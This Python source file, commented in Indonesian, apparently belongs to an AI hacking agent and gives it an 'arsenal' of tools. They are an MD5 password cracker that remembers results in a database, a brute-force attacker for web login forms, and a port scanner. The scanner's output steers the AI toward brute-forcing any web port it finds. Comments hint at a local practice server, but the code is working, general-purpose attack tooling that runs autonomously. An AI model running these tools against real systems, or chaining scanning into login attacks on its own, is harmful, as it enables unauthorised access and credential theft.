import hashlib
import aiosqlite
import aiohttp
import asyncio
from memory import DB_NAME, cek_memori_hash

# ==========================================
# GUDANG SENJATA (FUNGSI DETERMINISTIK)
# ==========================================

async def tool_crack_md5(target_hash: str, wordlist: list) -> str:
    """
    Fungsi untuk melakukan Brute Force pada hash MD5.
    Hanya akan melakukan komputasi jika hash belum ada di memori.
    """
    # 1. CEK MEMORI: AI mengingat pengalaman masa lalunya
    password_tersimpan = await cek_memori_hash(target_hash)
    if password_tersimpan:
        return f"✅ [MEMORI] Bos, saya ingat hash {target_hash} ini! Passwordnya adalah '{password_tersimpan}'. (Komputasi: 0 detik)"

    # 2. EKSEKUSI FISIK: Jika belum tahu, lakukan Brute Force
    print(f"⚙️ [EKSEKUTOR] Menjalankan brute force untuk hash: {target_hash}...")
    for word in wordlist:
        word_hash = hashlib.md5(word.encode()).hexdigest()
        
        # Jika password cocok
        if word_hash == target_hash:
            # 3. BELAJAR: Catat keberhasilan ke dalam memori
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute(
                    "INSERT OR REPLACE INTO hash_log (target_hash, cracked_password, status) VALUES (?, ?, 'SUCCESS')",
                    (target_hash, word)
                )
                await db.commit()
            return f"🔥 [BERHASIL] Hash {target_hash} jebol! Password: '{word}'"

    # 4. Jika gagal, catat juga agar AI tahu wordlist ini sudah tidak berguna
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            "INSERT OR IGNORE INTO hash_log (target_hash, cracked_password, status) VALUES (?, 'UNKNOWN', 'FAILED')",
            (target_hash,)
        )
        await db.commit()
    
    return f"❌ [GAGAL] Brute force selesai. Tidak ada yang cocok di wordlist."

async def tool_bruteforce_web(target_url: str, username: str, wordlist: list) -> str:
    """
    Fungsi untuk melakukan brute force pada halaman login sebuah website.
    AI akan memanggil ini jika mendeteksi form login.
    """
    print(f"⚙️ [EKSEKUTOR] Memulai serangan Web Brute Force ke {target_url} untuk user '{username}'...")
    
    # Kita menggunakan aiohttp ClientSession agar koneksi jauh lebih cepat
    async with aiohttp.ClientSession() as session:
        for password in wordlist:
            # Data yang biasanya dikirim saat form login di-submit (POST)
            payload = {
                "username": username,
                "password": password
            }
            
            try:
                async with session.post(target_url, data=payload, timeout=2) as response:
                    teks_balasan = await response.text()
                    teks_balasan_lower = teks_balasan.lower()
                    
                    # LOGIKA SUKSES
                    if "selamat" in teks_balasan_lower or "buka kado" not in teks_balasan_lower:
                        # Kita tambahkan teks_balasan ke dalam output!
                        return (
                            f"🔥 [BERHASIL] Login Web tembus!\n"
                            f"🎯 Target: {target_url}\n"
                            f"🔑 Password: {password}\n"
                            f"📄 [RESPON SERVER]:\n"
                            f"{'-'*40}\n"
                            f"{teks_balasan.strip()}\n"
                            f"{'-'*40}"
                        )
                    
                    print(f"   [INFO] Mencoba '{password}'... Gagal.")
            except Exception as e:
                return f"❌ [ERROR] Gagal menghubungi target {target_url}. Pastikan server menyala. Detail: {str(e)}"
            
            # Memberikan jeda sangat kecil agar tidak dituduh DDoS oleh server lokal sendiri
            await asyncio.sleep(0.1)

    return f"❌ [GAGAL] Seluruh wordlist telah dicoba untuk '{username}'. Tidak ada yang cocok."

async def cek_port(ip: str, port: int) -> int:
    """Fungsi internal pembantu untuk mengecek satu port"""
    try:
        # Kita beri batas waktu (timeout) sangat cepat: 0.5 detik
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=0.5
        )
        writer.close()
        await writer.wait_closed()
        return port
    except Exception:
        return 0

async def tool_scan_port(target_ip: str) -> str:
    """
    Fungsi untuk memindai port yang terbuka pada sebuah IP.
    """
    print(f"📡 [EKSEKUTOR] Memindai celah port di target {target_ip}...")
    
    # Daftar port umum (termasuk port 5000 web Anda)
    port_umum = [21, 22, 80, 443, 3306, 5000, 8080]
    
    # Menjalankan pengecekan semua port secara bersamaan (Concurrent)
    tasks = [cek_port(target_ip, p) for p in port_umum]
    results = await asyncio.gather(*tasks)
    
    port_terbuka = [p for p in results if p != 0]
    
    if port_terbuka:
        return f"🔍 [INFO PENTING] Port yang terbuka di {target_ip} adalah: {port_terbuka}. (Catatan untuk AI: Jika ada port 80, 5000, atau 8080, itu adalah server web, pertimbangkan untuk menggunakan tool_bruteforce_web)."
    else:
        return f"❌ [GAGAL] Tidak ada port umum yang terbuka di {target_ip}."